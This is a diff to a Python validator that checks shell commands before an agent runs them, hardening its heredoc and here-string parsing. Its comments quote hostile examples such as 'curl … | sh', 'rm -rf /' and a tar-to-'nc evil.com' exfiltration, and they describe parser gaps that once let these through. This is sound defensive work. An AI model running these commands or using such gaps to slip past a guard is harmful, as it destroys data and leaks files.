@@ -11,7 +11,7 @@ import subprocess
 import threading
 from dataclasses import dataclass, field, replace
 from pathlib import Path
-from typing import Any, Optional
+from typing import Any, NamedTuple, Optional
 
 import yaml
 
@@ -638,10 +638,13 @@ def _shell_delegated_payloads(
     `env FOO=1`, `busybox`, `flock ...`), `watch PROG`, and `find -exec/-execdir/-ok/-okdir
     <shell> -c PROG ;` (LAB-2767), whose clause re-enters this same extraction.
 
+    Here-strings (`bash <<< "..."`) ride a redirect node the word-walker never sees, so they
+    are surfaced by `parser.extract_stdin_program_redirects` instead and fed into the same
+    Step 5c re-entry as these payloads (LAB-2768).
+
     Deliberately NOT covered, each tracked separately: remote delegation (`ssh host "..."`,
-    a different trust domain); non-shell interpreters (`python3 -c`, `perl -e`) whose payload
-    is not bash and would be nonsense to re-validate as bash; and here-strings
-    (`bash <<< "..."`), which the AST hides on a redirect node. WRAPPER_COMMANDS is
+    a different trust domain) and non-shell interpreters (`python3 -c`, `perl -e`) whose
+    payload is not bash and would be nonsense to re-validate as bash. WRAPPER_COMMANDS is
     best-effort, not an exhaustive enumeration of every exec-passthrough binary.
 
     A first word that is neither a delegator nor a wrapper is never scanned, so
@@ -1520,7 +1523,10 @@ def _read_delimiter(text: str, pos: int) -> tuple[str, int]:
         elif char in "'\"":
             pos += 1
             while pos < len(text) and text[pos] != char:
-                if char == '"' and text[pos] == "\\" and pos + 1 < len(text):
+                # Inside double quotes a backslash escapes only `$ ` " \` and a newline;
+                # before anything else bash keeps it, so `<<"a\b"` ends at a line
+                # reading `a\b`, not `ab`.
+                if char == '"' and text[pos] == "\\" and pos + 1 < len(text) and text[pos + 1] in '$`"\\\n':
                     pos += 1
                 delimiter.append(text[pos])
                 pos += 1
@@ -1538,7 +1544,7 @@ def _read_delimiter(text: str, pos: int) -> tuple[str, int]:
 
 def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; splitting it hides the state machine
     line: str, scan: _ScanState, at: int, dparen: _DoubleParen
-) -> tuple[str, list[tuple[str, bool, int]]]:
+) -> tuple[str, list[tuple[str, bool, int, int]]]:
     """Replace this line's heredoc delimiters with the placeholder, in shell order.
 
     Only an *unquoted, unexpanded* `<<` opens a heredoc. Bash reads `echo "x << y"`,
@@ -1563,14 +1569,16 @@ def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; 
     ``at`` is where ``line`` starts in ``dparen``'s text - the whole command -
     because a `((` is decided by text that may lie on later lines.
 
-    Returns ``(rewritten line, [(delimiter, strips_tabs, offset)] in opener
-    order)``; each ``offset`` is where its `<<` sits, which is the only honest
+    Returns ``(rewritten line, [(delimiter, strips_tabs, start, end)] in opener
+    order)``; each ``start`` is where its `<<` sits, which is the only honest
     source for "what command owns this heredoc" - a second regex looking for the
-    first `<<` would find the quoted ones this deliberately skipped.
+    first `<<` would find the quoted ones this deliberately skipped. ``end`` is
+    just past the delimiter word, so `_normalise_heredoc_delimiters` can splice
+    the opener without re-lexing it.
     """
     frames = scan.frames
     out: list[str] = []
-    openers: list[tuple[str, bool, int]] = []
+    openers: list[tuple[str, bool, int, int]] = []
     continued = False
     pos = 0
     opener_serials: list[int] = []
@@ -1780,7 +1788,7 @@ def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; 
             while pos < len(line) and line[pos] in " \t":
                 pos += 1
             delimiter, pos = _read_delimiter(line, pos)
-            openers.append((delimiter, strips_tabs, opener_at))
+            openers.append((delimiter, strips_tabs, opener_at, pos))
             opener_serials.append(scan.contexts[-1].serial)
             out.append(f"<<{'-' if strips_tabs else ''}{_HEREDOC_PLACEHOLDER}")
         else:
@@ -1812,11 +1820,272 @@ def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; 
     return "".join(out), openers
 
 
+# A delimiter that can be written bare: no blank, no metacharacter, nothing that
+# would re-cut the opener line once the quotes come off. `<<'A;B'` is a legal
+# heredoc whose quote-removed delimiter is not a bare word, and emitting `<<A;B`
+# would start a second command out of thin air - the same hazard that made
+# _neuter_heredocs invent a placeholder rather than reuse the real delimiter.
+#
+# The leading character is excluded separately because the hazard there is
+# RE-LEXING, not metacharacters: `-` is a perfectly legal first character of a
+# delimiter (`<<'-q'` ends at a line reading `-q`), but emitting it bare gives
+# `<<-q`, which bash reads as the `<<-` operator plus delimiter `q`. The body then
+# ends at the wrong line and the commands in between are filed as inert text.
+_BARE_DELIMITER_RE = re.compile(r"\A[\w.+][\w.+-]*\Z")
+
+
+def _blank_body_line(line: str) -> str:
+    """Replace a quoted heredoc body line with inert filler of the same length.
+
+    A quoted delimiter makes the body LITERAL: bash neither expands it nor joins its
+    continued lines. Take the quotes off and both of those turn back on, and each one
+    is a live under-block (LAB-3094):
+
+    - `x\\` on a body line joins onto the NEXT line once unquoted, so a terminator
+      sitting there stops being one. The body then runs to some later terminator and
+      swallows whatever real shell lay between - a `curl … | sh` scored SAFE.
+    - `${` alone is literal text quoted, and an unterminated expansion unquoted. That
+      is a PARSE error to ShellCheck (SC1009/SC1073/SC1072), which are discarded as
+      non-security findings - so the whole ShellCheck tier went silently dark and a
+      `rm -fr /lib` after the terminator stopped being caught.
+
+    So the rewrite may fix the delimiter's SPELLING, but it must not let the body be
+    re-interpreted. Filler keeps the one property bashlex needs from a body - its
+    length and line count, so every offset and boundary still lands where it did -
+    while carrying nothing that can expand, continue a line, or fail to parse.
+
+    The body is not lost: a shell consumer's real body is validated as code, read from
+    the original command at the spans `_normalise_heredoc_delimiters` records (see
+    `_shell_heredoc_bodies`). For a
+    non-shell consumer the body is inert text that `_is_in_non_shell_heredoc` would
+    have suppressed from matching anyway.
+    """
+    return "x" * len(line)
+
+
+def _phantom_heredoc(parse_target: str, nodes: list[Any], opener_starts: frozenset[int]) -> Optional[str]:
+    """The delimiter of a heredoc bashlex reads that the scan never opened, if any.
+
+    The native-path twin of `_refuse_a_heredoc_the_rewrite_did_not_write`, needed for the
+    same reason: bash reads `(( 1<<b ))` as a left shift, and so does the scan in
+    `_normalise_heredoc_delimiters`, but bashlex reads `<<b` as a redirection and files
+    the lines behind it as inert body. Without this, a quoted heredoc moved off the
+    fallback would lose the fallback's refusal of exactly that.
+
+    Openers are matched by POSITION. Matching where heredocs end is not enough: a phantom
+    can take a real heredoc's terminator while the real one runs on to a later line, and
+    the two sets of ends come out equal. It walks the same attributes the fallback's guard
+    does, so it never looks inside a `$( … )`, where the scan is known to miss openers
+    bashlex reads correctly (LAB-4615) and a disagreement would be the scan's error.
+    """
+
+    def visit(node: Any) -> Optional[str]:
+        if getattr(node, "heredoc", None) is not None:
+            start, end = node.pos
+            if parse_target.find("<<", start, end) not in opener_starts:
+                word = getattr(getattr(node, "output", None), "word", None)
+                return (word or "?").strip()
+        for attribute in ("parts", "list", "commands"):
+            for child in getattr(node, attribute, None) or []:
+                found = visit(child)
+                if found is not None:
+                    return found
+        return None
+
+    for node in nodes:
+        found = visit(node)
+        if found is not None:
+            return found
+    return None
+
+
+def _shell_heredoc_bodies(command: str, blanked: list[tuple[int, int, int]], heredoc_ranges: list[tuple]) -> list[str]:
+    """The real text of every blanked heredoc body that may be executed as code.
+
+    `bash <<'EOF'` hands its body to bash as a program, which is the same relationship
+    `bash -c "…"` has with its argument - so the body is routed to the same
+    shell-delegation merge, and inherits its depth cap and worst-verdict-wins rule
+    rather than growing a second one.
+
+    ``blanked`` is `_normalise_heredoc_delimiters`' own record of what it blanked:
+    ``(body_start, body_end, terminator_end)`` in ``command``. Those spans locate the
+    body; bashlex is consulted only for the CONSUMER, because its heredoc ranges are
+    only half right. Checked against an independent bash parser (mvdan/sh), bashlex
+    agrees on where a heredoc ENDS wherever it reports one, but inside a compound
+    statement (`for`/`if`/a function body) it starts the range a line late, dropping
+    the body's first line - all of a one-line body. Reading the body from that range
+    returned `EOF` and nothing else, and `for i in 1; do bash <<'EOF'` / `rm -rf /`
+    scored SAFE. A compound's own redirect (`while …; done <<'EOF'`) gets no range at
+    all, so its body counts as code: a data line there that reads as a dangerous
+    command is denied - a false positive, in the direction this errs on purpose.
+
+    So spans are matched to ranges by their END, and a blanked body whose consumer
+    bashlex does not report as inert is treated as code. An unknown consumer gets its
+    body validated, not trusted: the cost of that error is a false positive.
+    """
+    inert_ends = {end for _, end, is_shell in heredoc_ranges if not is_shell}
+    return [
+        command[body_start:body_end]
+        for body_start, body_end, terminator_end in blanked
+        if terminator_end not in inert_ends and command[body_start:body_end].strip()
+    ]
+
+
+class _Normalised(NamedTuple):
+    """What `_normalise_heredoc_delimiters` hands back, beyond the rewritten text."""
+
+    text: str
+    # (body_start, body_end, terminator_end) in the ORIGINAL command, one per body blanked.
+    blanked: list[tuple[int, int, int]]
+    # Where each `<<` the scan found sits, quoted or not (see `_phantom_heredoc`).
+    opener_starts: frozenset[int]
+
+
+def _splice_openers(line: str, openers: list[tuple[str, bool, int, int]]) -> tuple[str, list[bool]]:
+    """Rewrite each opener on ``line`` to its bare delimiter, padded to the original width.
+
+    Returns the rewritten line and, per opener, whether its delimiter was quoted - which
+    is what decides whether the BODY changes meaning under the rewrite, the whole hazard
+    `_blank_body_line` exists for.
+
+    Raises:
+        ParseError: a delimiter with no bare spelling (see `_BARE_DELIMITER_RE`).
+    """
+    pieces: list[str] = []
+    was_quoted: list[bool] = []
+    cursor = 0
+    for delimiter, strips_tabs, start, end in openers:
+        # Quoted means the WORD differs from its quote-removed self - never "the opener
+        # would be respelled": `<< EOF` respells (the blank goes) but is unquoted, its body
+        # expands, and blanking it would hide a `$(…)` bash really runs.
+        written = line[start + (3 if strips_tabs else 2) : end].lstrip(" \t")
+        if written == delimiter:
+            was_quoted.append(False)
+            continue  # already parses as bash reads it; left byte for byte
+        if not _BARE_DELIMITER_RE.match(delimiter):
+            raise ParseError(f"Heredoc delimiter {delimiter!r} has no bare spelling")
+        # Quote removal only ever shortens the word, so this always fits its span.
+        pieces += [line[cursor:start], f"<<{'-' if strips_tabs else ''}{delimiter}".ljust(end - start)]
+        was_quoted.append(True)
+        cursor = end
+    pieces.append(line[cursor:])
+    return "".join(pieces), was_quoted
+
+
+def _normalise_heredoc_delimiters(command: str) -> _Normalised:
+    """Rewrite `<<'EOF'` to `<<EOF ` so bashlex ends the body where bash does.
+
+    bashlex takes the delimiter *as written*, quotes and all, so `<<'EOF'` ends at a
+    line reading `'EOF'` while bash ends at one reading `EOF`. Both halves of
+    LAB-3094 are that one disagreement:
+
+    - no literal `'EOF'` line exists, so bashlex raises and the command detours into
+      the permissive fallback, which discards the body - a shell heredoc's *program*
+      - and scores the head alone (`bash <<'EOF'` / `rm -rf /` came back LOW);
+    - a literal `'EOF'` line does exist, so bashlex parses but files every real
+      command between the two boundaries as inert body text (`cat <<'EOF'` with a
+      bare `EOF` line, then `rm -rf /`, came back SAFE - bash runs the `rm`).
+
+    Normalising up front puts both back on the main path, where the delimiter means
+    what bash means by it. That keeps well-formed heredocs off the fallback - the
+    permissive path - with the exceptions `_validate_heredoc_command` lists.
+
+    The rewrite is LENGTH-PRESERVING - the delimiter loses its quotes and the opener
+    is padded back out with blanks - and that is load-bearing, not tidy. Callers
+    parse and match the rewritten text, but two checks set bashlex's offsets (taken
+    on the rewrite) against offsets this function took on the ORIGINAL: the phantom
+    guard (`_phantom_heredoc`) and the consumer lookup (`_shell_heredoc_bodies`).
+    They agree only if a byte means the same thing in both strings; shorten the
+    opener and every heredoc after it lands two bytes off, so each one reads as a
+    phantom or as nobody's body.
+
+    A quoted delimiter also makes the BODY literal, and that does NOT survive quote
+    removal, so a quoted heredoc's body is replaced with inert filler of the same length
+    and line count rather than carried verbatim; `_blank_body_line` documents why.
+    An unquoted delimiter changes nothing at all here, so that path is untouched.
+
+    Only opener lines are scanned: a `<<` inside a body is data, not a heredoc.
+
+    Returns a `_Normalised`: the text, the body spans it blanked, and where each opener
+    it found sits. When it cannot read the command - a delimiter with no bare spelling,
+    a body with no terminator, an opener on a continued line, a frame still open at the
+    end - it returns the command unchanged and records nothing. Those keep exactly the
+    route they had: bashlex rejects them and the fallback decides, failing closed where
+    it cannot read them.
+    """
+    if "<<" not in command:
+        return _Normalised(command, [], frozenset())
+
+    lines = command.split("\n")
+    out: list[str] = []
+    # One scan state and one `((` oracle for the whole command, exactly as
+    # `_neuter_heredocs` builds them: every frame the scanner tracks may span a
+    # newline, and a `((` is decided by text on later lines.
+    scan = _ScanState()
+    dparen = _DoubleParen(command)
+    at = 0  # where lines[index] starts in command
+    index = 0
+    changed = False
+    blanked: list[tuple[int, int, int]] = []  # (body_start, body_end, terminator_end) in command
+    opener_starts: set[int] = set()
+
+    try:
+        while index < len(lines):
+            line = lines[index]
+            _, openers = _rewrite_openers(line, scan, at, dparen)
+            opener_starts.update(at + start for _, _, start, _ in openers)
+            at += len(line) + 1
+            index += 1
+
+            line, was_quoted = _splice_openers(line, openers)
+            changed = changed or any(was_quoted)
+
+            out.append(line)
+
+            # Bodies are consumed in opener order, exactly as _neuter_heredocs does it,
+            # and for the same reason: the delimiter comparison has to match bash's or a
+            # body line gets mistaken for the terminator.
+            for (delimiter, strips_tabs, _, _), quoted in zip(openers, was_quoted):
+                body_start = at
+                while index < len(lines):
+                    body = lines[index]
+                    line_at = at
+                    at += len(body) + 1
+                    index += 1
+                    if (body.lstrip("\t") if strips_tabs else body) == delimiter:
+                        out.append(body)  # terminator stays verbatim; bashlex ends here
+                        if quoted:
+                            # The body runs up to the newline before the terminator; an
+                            # empty one slices to "" and is never delegated.
+                            blanked.append((body_start, line_at - 1, line_at + len(body)))
+                        break
+                    out.append(_blank_body_line(body) if quoted else body)
+                else:
+                    # No terminator: where the body ends is unknown, so which text is
+                    # shell is unknown. Hand it back untouched and let the fallback deny.
+                    raise ParseError(f"Heredoc {delimiter!r} has no terminator")
+
+        if scan.frames or len(scan.contexts) > 1:
+            # An unclosed quote, expansion, `((`, subscript or `$(` at the end: the
+            # boundaries above were drawn by a scan that never closed, so none of
+            # them is trustworthy. `_neuter_heredocs` raises on exactly this, and
+            # handing the command back sends it to that same refusal.
+            raise ParseError("Command ends inside an unclosed frame")
+    except ParseError:
+        # Every reading this cannot vouch for leaves the command as written. The
+        # rewrite is an optimisation of the parse, never a decision about safety.
+        return _Normalised(command, [], frozenset())
+
+    return _Normalised("\n".join(out) if changed else command, blanked, frozenset(opener_starts))
+
+
 def _neuter_heredocs(command: str) -> tuple[str, str]:
     """Rewrite a heredoc into something bashlex parses, keeping the rest verbatim.
 
     bashlex rejects a quoted heredoc delimiter outright, which is why this
-    fallback exists at all - and why the shell *around* the heredoc (a trailing
+    fallback exists at all. Since LAB-3094 a well-formed one is normalised and
+    parsed natively (`_normalise_heredoc_delimiters`); what still arrives here is
+    listed on `_validate_heredoc_command`. That is also why the shell *around* the heredoc (a trailing
     ``rm -rf /``, an enclosing ``for … done``) arrives here unparsed. Bash has no
     such trouble, so that surrounding shell has to be recovered somehow.
 
@@ -1859,7 +2128,7 @@ def _neuter_heredocs(command: str) -> tuple[str, str]:
         # Bodies are consumed in opener order. `<<-` strips leading tabs from the
         # terminator line as well as the body, so the comparison has to match
         # bash's or a body line would be mistaken for the terminator.
-        for delimiter, strips_tabs, _ in openers:
+        for delimiter, strips_tabs, _, _ in openers:
             # One placeholder line stands in for the entire body. It cannot be
             # dropped altogether: bashlex rejects an empty heredoc inside a
             # compound statement, which would deny every `for … do
@@ -1897,7 +2166,13 @@ def _validate_heredoc_command(
 ) -> Optional[ValidationResult]:
     """Validate command containing heredoc that bashlex couldn't parse.
 
-    Bashlex doesn't support quoted heredoc delimiters (e.g. << 'EOF'). This
+    Bashlex doesn't support quoted heredoc delimiters (e.g. << 'EOF'). Since
+    LAB-3094 `_normalise_heredoc_delimiters` rewrites the well-formed ones, and what
+    still arrives here is: a heredoc it cannot rewrite (a delimiter with no bare
+    spelling - `<<'A;B'`, or `<<'EOF'` under CRLF, whose word ends in `\r` - a body
+    with no terminator, a frame still open at the end); an opener the scan cannot see
+    (inside a double-quoted `$( … )`), whose quoted delimiter bashlex then rejects; and
+    a rewrite bashlex still rejects (an empty heredoc inside a compound). This
     validates the command in front of the heredoc, then the shell the heredoc
     does not swallow as the separate commands bash will run, taking the worse
     of the two verdicts.
@@ -1922,6 +2197,12 @@ def _validate_heredoc_command(
         if over is not None:
             return over
         base_result = _heredoc_base_result(engine, base_command)
+        if base_result.risk_level is RiskLevel.BLOCKED:
+            # Escalation only ever RAISES risk and BLOCKED is the top of the enum, so
+            # the two extra front-door passes provably cannot change this verdict -
+            # they just re-validate a denied command at a cost that grows with its
+            # segment count.
+            return base_result
         return _escalate_past_heredoc(command, neutered, base_result, config_path)
     except ParseError as e:
         # Shell we cannot read is shell we cannot vouch for.
@@ -1942,6 +2223,35 @@ def _validate_heredoc_command(
 def _heredoc_base_result(engine: "RuleEngine", base_command: str) -> ValidationResult:
     """Verdict for the heredoc's own command, ignoring everything around it."""
     first_word = base_command.split()[0]
+
+    # CEILING: a denylist of the bare shell names in `_SHELL_COMMANDS`, tested against the
+    # first opener's head as written - not every consumer that executes its body. The
+    # upgrade path is to ask "will this consumer EXECUTE the body" rather than "is this
+    # word a shell": the wrapper walk at `_shell_delegated_payloads`, applied to every
+    # opener's head rather than only the first.
+    if first_word in _SHELL_COMMANDS:
+        # A shell's heredoc body IS its program, and `_neuter_heredocs` has already
+        # thrown that body away - so every verdict below this line would be vouching
+        # for code nothing ever read.
+        #
+        # This path is only reached when the body could not be read in the first
+        # place (see `_validate_heredoc_command` for what arrives here), so
+        # `bash <<'A;B'` / `rm -rf /` scored LOW while the identical command with a
+        # bare delimiter is BLOCKED (LAB-3094).
+        #
+        # Ahead of the whitelist check, not after: whitelisting is a statement about
+        # the command, and here the command is not what runs.
+        return ValidationResult(
+            allowed=False,
+            risk_level=RiskLevel.BLOCKED,
+            message=f"BLOCKED: Cannot read the program '{first_word}' would run from this heredoc",
+            # One alternative, deliberately. A denial is read by an agent that may act on
+            # it, so its advice must not be a route around the control that issued it.
+            alternatives=["Use a plain-word heredoc delimiter (<<'EOF'), which is read and validated"],
+            exit_code=1,
+            error=f"Unreadable heredoc delimiter in front of shell interpreter '{first_word}'",
+            matched_rules=[],
+        )
 
     if engine.is_whitelisted(first_word):
         return ValidationResult(
@@ -2140,25 +2450,29 @@ def _escalate_past_heredoc(
     return result
 
 
-def _substitution_denial(sub_result: SubstitutionValidationResult) -> ValidationResult:
+def _substitution_verdict(sub_result: SubstitutionValidationResult) -> ValidationResult:
     """Render a substitution verdict as a ValidationResult.
 
     The hook maps risk to the action, so only a genuine BLOCKED verdict may claim the word: an
     amplified-HIGH one is shown as an "ask" prompt, and a prompt whose text reads "BLOCKED" tells
-    the user the opposite of the truth.
+    the user the opposite of the truth. An allowed verdict stays allowed: it carries a rule match
+    that decides the level without denying (LAB-4223).
     """
     denied = sub_result.risk_level == RiskLevel.BLOCKED
     return ValidationResult(
-        allowed=False,
+        allowed=sub_result.allowed,
         risk_level=sub_result.risk_level,
         message=f"BLOCKED: {sub_result.message}" if denied else sub_result.message,
-        alternatives=[
+        alternatives=[]
+        if sub_result.allowed
+        else [
             "Use whitelisted read-only commands in substitution (e.g. ls, cat, grep, head, wc, sort, git)",
             "Run the command directly instead of using substitution",
             "If this command is safe, request it be added to the whitelist",
         ],
-        exit_code=1,
+        exit_code=0 if sub_result.allowed else 1,
         error=None,
+        matched_rules=list(sub_result.matched_rules),
     )
 
 
@@ -2173,10 +2487,11 @@ def validate_command(
     """Validate a command for safety — the main validation API.
 
     Runs every pass (:func:`_validate_command`), then joins the verdict with any substitution
-    denial too weak to have short-circuited it. The join lives HERE, outside the passes, because
-    a join made at any one pass is a join the passes added after it will miss: that is precisely
-    how a BLOCKED netcat backdoor and a BLOCKED pipeline segment each walked back down to HIGH
-    merely by having a substitution appended. Whatever returns first, the worse verdict wins.
+    verdict above SAFE too weak to have short-circuited it. The join lives HERE, outside the
+    passes, because a join made at any one pass is a join the passes added after it will miss:
+    that is precisely how a BLOCKED netcat backdoor and a BLOCKED pipeline segment each walked
+    back down to HIGH merely by having a substitution appended. Whatever returns first, the
+    worse verdict wins.
 
     ``_depth``, ``_shellcheck`` and ``_derived`` are internal, keyword-only; see
     :func:`_validate_command`.
@@ -2187,12 +2502,26 @@ def validate_command(
     )
     if not deferred:
         return result
-    sub_denial = deferred[0]
-    # A denial always beats an allow, whatever their levels; between two denials the higher
-    # level wins, and a tie keeps the completed verdict because it carries the matched rules.
-    if result.allowed or sub_denial.risk_level > result.risk_level:
-        return _substitution_denial(sub_denial)
-    return result
+    sub = _substitution_verdict(deferred[0])
+    # The higher level wins, on level alone: a HIGH rule match arrives with allowed=True, so
+    # deciding on `allowed` sent every HIGH tie to the substitution and `rm -r d $(base64 -d f)`
+    # lost `recursive_delete`. A tie is denied if either half is, and reports both halves, so a
+    # cheap HIGH rule up front cannot hide the refused substitution from the prompt. Only
+    # `deferred[0]`, the first worst substitution, is named. An allowed substitution verdict (a
+    # rule match below HIGH, LAB-4223) joins the same way and denies nothing.
+    if sub.risk_level > result.risk_level:
+        return sub
+    if sub.risk_level < result.risk_level:
+        return result
+    allowed = result.allowed and sub.allowed
+    return replace(
+        result,
+        allowed=allowed,
+        exit_code=0 if allowed else 1,
+        message=f"{result.message}; {sub.message}",
+        alternatives=[*result.alternatives, *sub.alternatives],
+        matched_rules=[*result.matched_rules, *sub.matched_rules],
+    )
 
 
 def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation flow
@@ -2206,7 +2535,7 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
 ) -> ValidationResult:
     """Run every validation pass. Call :func:`validate_command` instead.
 
-    ``_deferred`` is an out-parameter: a substitution denial too weak to short-circuit is placed
+    ``_deferred`` is an out-parameter: a substitution verdict above SAFE and below BLOCKED is placed
     there for the caller to join. It is a list rather than a return value so that every one of
     this function's returns carries it without having to remember to.
 
@@ -2295,14 +2624,40 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
 
         # Step 4: Parse command and extract AST context
         parser = _get_parser()
+        # bashlex ends a heredoc at the delimiter as written, bash at the delimiter with
+        # its quotes removed. Reconciling the two before parsing is what keeps a quoted
+        # delimiter on this path at all - and the rewrite is length-preserving precisely
+        # so the offsets below still address `command` (LAB-3094).
+        normalised = _normalise_heredoc_delimiters(command)
+        parse_target = normalised.text
+        # A quoted delimiter was normalised. Every such command took the heredoc fallback
+        # before LAB-3094 or was misread by bashlex, so two guards the fallback applied are
+        # kept for exactly these: the phantom-heredoc refusal and the ShellCheck no-verdict
+        # refusal. A superset of the old fallback inputs; its extra members fail closed.
+        rewrote_quoted = parse_target != command
         try:
-            ast = parser.parse(command)
+            ast = parser.parse(parse_target)
             # Extract string literals for context-aware matching
-            string_literals = parser.extract_string_literals(command, ast)
+            string_literals = parser.extract_string_literals(parse_target, ast)
 
             # Extract heredoc ranges - matches inside non-shell heredocs should be ignored
             # 'cat << EOF' just outputs text, 'bash << EOF' executes it
-            heredoc_ranges = parser.extract_heredoc_ranges(command, ast)
+            heredoc_ranges = parser.extract_heredoc_ranges(parse_target, ast)
+            phantom = _phantom_heredoc(parse_target, ast, normalised.opener_starts) if rewrote_quoted else None
+            if phantom is not None:
+                error = (
+                    f"bashlex reads a heredoc {phantom!r} that this command does not open; "
+                    "the text behind it would be dropped as its body"
+                )
+                return ValidationResult(
+                    allowed=False,
+                    risk_level=RiskLevel.BLOCKED,
+                    message=f"BLOCKED: Cannot determine what this heredoc runs: {error}",
+                    alternatives=["Run the commands around the heredoc separately"],
+                    exit_code=1,
+                    error=error,
+                )
+                # Not cached: a parse-level refusal, like the parse errors below.
 
             # Check for dangerous constructs (eval/exec, dangerous pipelines)
             dangerous_constructs = parser.has_dangerous_constructs(ast)
@@ -2334,10 +2689,12 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
             # SAFE for the whole command. Only a genuine BLOCKED verdict short-circuits; anything
             # weaker is handed to the caller, which joins it against the completed verdict.
             for sub_result in sub_results:
-                if sub_result.allowed:
-                    continue  # Don't cache (substitution content may vary)
+                # An allowed verdict above SAFE is a rule match that decides the level (LAB-4223):
+                # it is owed the join too, and deferring it also keeps the pre-join verdict uncached.
+                if sub_result.allowed and sub_result.risk_level == RiskLevel.SAFE:
+                    continue
                 if sub_result.risk_level == RiskLevel.BLOCKED:
-                    return _substitution_denial(sub_result)
+                    return _substitution_verdict(sub_result)
                 if _deferred is not None and (not _deferred or sub_result.risk_level > _deferred[-1].risk_level):
                     _deferred[:] = [sub_result]
 
@@ -2349,6 +2706,18 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
             dangerous_check = _check_dangerous_command_flags(commands_with_args)
             if dangerous_check is not None:
                 return dangerous_check
+
+            # LAB-2768: here-strings (`bash <<< PROG`) execute PROG the same way `bash -c PROG`
+            # does, but the payload rides a redirect node the extractor above skips. Surface it
+            # here; only SHELL here-strings are re-validated as bash (a python/perl here-string is
+            # not bash and would be nonsense to re-check). Fed into the Step 5c re-entry below.
+            herestring_payloads = list(
+                dict.fromkeys(
+                    prog
+                    for name, prog in parser.extract_stdin_program_redirects(ast)
+                    if name in _SHELL_COMMANDS and prog.strip()
+                )
+            )
 
         except (ParseError, ValueError) as e:
             # Check if this is a heredoc parse failure (bashlex doesn't support quoted delimiters)
@@ -2378,7 +2747,9 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
             # e.g., "ls | rm -rf /" should NOT be allowed just because "ls" is whitelisted
             # Literal ranges come from the SAME parse — see the method's docstring
             # for why the per-segment re-parse had to go (spec §3.2 parse-once).
-            segments = parser.extract_command_segments_with_literals(command, ast)
+            # `parse_target`, not `command`: segments are sliced at positions from
+            # `ast`, which was built from the normalised string (LAB-3094).
+            segments = parser.extract_command_segments_with_literals(parse_target, ast)
 
             # Track all matched rules for audit logging (used when multiple segments)
             all_matched_rules = []
@@ -2396,7 +2767,7 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                 # its prefix (is_fully_whitelisted, not is_whitelisted). A prefix match
                 # would let the whitelisted "ls" in "ls; rm -rf /" vouch for every later
                 # segment and skip the loop below entirely.
-                if engine.is_fully_whitelisted(command):
+                if engine.is_fully_whitelisted(parse_target):
                     result = ValidationResult(
                         allowed=True,
                         risk_level=RiskLevel.SAFE,
@@ -2428,7 +2799,7 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         [segment.node],
                         string_literals=segment.string_literals,
                         heredoc_ranges=segment.heredoc_ranges,
-                        quote_source=command,
+                        quote_source=parse_target,
                     )
 
                     if seg_match.matched and seg_match.rule:
@@ -2439,8 +2810,17 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         highest_risk = seg_match.risk_level
                         highest_match = seg_match
 
-                # Use highest risk found, or SAFE if none
-                if highest_match:
+                # Re-check the whole command so cross-segment rules (e.g. "tar ... | nc ...")
+                # fire, and take the higher of it and the segments. Unconditional: a rule a
+                # segment matched says nothing about a rule only the whole command can match.
+                # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
+                # already settled above by is_fully_whitelisted(). match_command()'s
+                # own whitelist check is prefix-based, and honouring it here would let
+                # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
+                match = engine.match_command(parse_target, string_literals=string_literals, use_whitelist=False)
+                if not highest_match:
+                    all_matched_rules = []
+                if highest_match and highest_risk >= match.risk_level:
                     match = RuleMatch(
                         matched=True,
                         rule=highest_match.rule,
@@ -2448,15 +2828,8 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         message=highest_match.message,
                         alternatives=highest_match.alternatives,
                     )
-                else:
-                    # No single segment matched a rule; re-check the whole command so
-                    # cross-segment rules (e.g. "tar ... | nc ...") still fire.
-                    # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
-                    # already settled above by is_fully_whitelisted(). match_command()'s
-                    # own whitelist check is prefix-based, and honouring it here would let
-                    # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
-                    match = engine.match_command(command, string_literals=string_literals, use_whitelist=False)
-                    all_matched_rules = []
+                elif all_matched_rules and match.rule:
+                    all_matched_rules.append(match.rule.name)
             else:
                 # Single segment - validate both original and reconstructed command
                 # SECURITY: Bashlex unescapes characters (e.g., 'rm\ -rf\ /' → 'rm -rf /')
@@ -2464,12 +2837,29 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                 match = _match_original_and_reconstructed(
                     engine,
                     parser,
-                    command,
+                    parse_target,
                     ast,
                     string_literals=string_literals,
-                    quote_source=command,
+                    quote_source=parse_target,
                     heredoc_ranges=heredoc_ranges,
                 )
+
+            # A `"$(…)"` body is code, which the passes above suppressed with its quoted
+            # word. Matched once, over the whole AST, after the segments are rated: a `for`
+            # word list is in no segment, and a body only ever raises the verdict those
+            # checks reached, never takes part in reaching it. No whitelist: a body can be
+            # a whole list, and whitelist patterns are prefix matches.
+            for body in parser.extract_quoted_substitution_bodies(command, ast):
+                body_match = engine.match_command(
+                    body.text,
+                    string_literals=body.string_literals,
+                    heredoc_ranges=body.heredoc_ranges,
+                    use_whitelist=False,
+                )
+                if body_match.risk_level > match.risk_level:
+                    match = body_match
+                    if all_matched_rules and body_match.rule:
+                        all_matched_rules.append(body_match.rule.name)
         except ConfigurationError as e:
             return ValidationResult(
                 allowed=False,
@@ -2510,12 +2900,34 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
         # Step 5c: shell-delegated payloads (LAB-2754).
         # `bash -c PROG` / `watch PROG` execute PROG. Re-enter validation on it and take the
